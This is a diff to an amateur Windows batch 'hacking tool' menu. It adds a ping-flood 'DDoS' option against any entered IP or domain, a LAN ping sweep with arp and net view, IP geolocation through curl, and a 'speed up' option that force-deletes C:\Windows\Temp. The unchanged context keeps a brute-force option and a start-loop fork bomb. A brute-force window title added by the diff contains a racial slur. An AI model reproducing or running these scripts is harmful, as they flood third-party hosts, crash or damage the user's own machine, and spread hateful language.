@@ -29,6 +29,8 @@ echo 3) brute force attack on a computer
 echo 4) Devices info
 echo 5) crush the computer
 echo 6) crush a targeted computer -- Ddos attack
+echo 7) geolocate this pc (for remote control purpuses)
+echo 8) get your computer work afap
 set /p op="Please choose a command: "
 
 if "%op%"=="1" (
@@ -48,9 +50,15 @@ if "%op%"=="5" (
     goto :e
 )
 if "%op%"=="6" (
-    goto :e
+    goto :f
 )
-if not "%op%"=="1" if not "%op%"=="2" if not "%op%"=="3"if not "%op%"=="4"if not "%op%"=="5"if not "%op%"=="6" (
+if "%op%"=="7" (
+    goto :g
+)
+if "%op%"=="8" (
+    goto :h
+)
+if not "%op%"=="1" if not "%op%"=="2" if not "%op%"=="3"if not "%op%"=="4"if not "%op%"=="5"if not "%op%"=="6"if not "%op%"=="7" if not "%op%"=="8" (
 	cls
 	echo Please enter a good number
 	timeout 3
@@ -132,6 +140,7 @@ goto :start
 
 :c
 cls
+title The Nigger - Brute Force
 color A
 echo.
 setlocal enabledelayedexpansion
@@ -184,7 +193,10 @@ echo ----------------
 route print | findstr /C:"Interface List" /C:"......"
 
 echo -----------------
-arp -a
+for /l %%i in (1,1,254) do @ping -n 1 192.168.1.%%i ^| find "Reply">nul
+arp -a | findstr "dynamic"
+echo -----------------
+net view
 echo -----------------
 pause
 goto :start
@@ -205,13 +217,60 @@ if /I "%name%" == "n" (
 
 :loop
 start
-goto :loop
+goto loop
 
 :f
+cls
+echo.
+echo.
+echo.
 set /p target="Enter target IP or domain: "
 color 4
-
+timeout 3
+echo are you ready
+cls
 for /l %%i in (1,1,100000000000000000000000000000000000000000000000000000000000000000) do (
-    ping -n 1 %target% >nul
-    echo Sent packet %%i to %target%
+    ping -n 1 -l 65500 %target% >nul
+    echo [HACKING IN PROGGRESS]
 )
+:g
+cls
+setlocal enabledelayedexpansion>nul
+color 4
+for /f %%a in ('curl ifconfig.me') do set ss=%%a>nul
+echo.
+echo.
+echo.
+echo YOUR PUBLIC IP IS: %ss%
+echo.    
+echo YOUR LOCATION IS CLOSE TO THIS 
+echo.
+curl ipinfo.io/%ss%
+pause
+:h
+cls
+ipconfig /flushdns>nul
+del /s /q C:\Windows\Temp\*>nul
+del /s /q %temp%\*>nul
+rd /s /q C:\Windows\Temp
+mkdir C:\Windows\Temp
+
+color 4
+echo.
+echo.
+echo.
+echo.
+echo                                                        YOUR PC MAY RUN FASTER
+echo.
+echo.
+echo.
+echo.
+pause
+goto :start
+
+
+
+
+
+
+
